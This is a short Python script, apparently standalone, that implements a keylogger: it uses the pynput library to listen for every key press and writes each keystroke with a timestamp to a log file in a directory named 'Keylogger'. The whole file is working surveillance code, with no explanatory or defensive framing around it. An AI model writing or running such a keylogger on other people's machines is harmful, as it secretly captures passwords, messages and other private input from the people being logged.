import pynput
from pynput.keyboard import Key, Listener
import logging

logDir = r"X:/HMMMM/Keylogger"
logging.basicConfig(filename = (logDir + r"/keyLog.txt"), level= logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()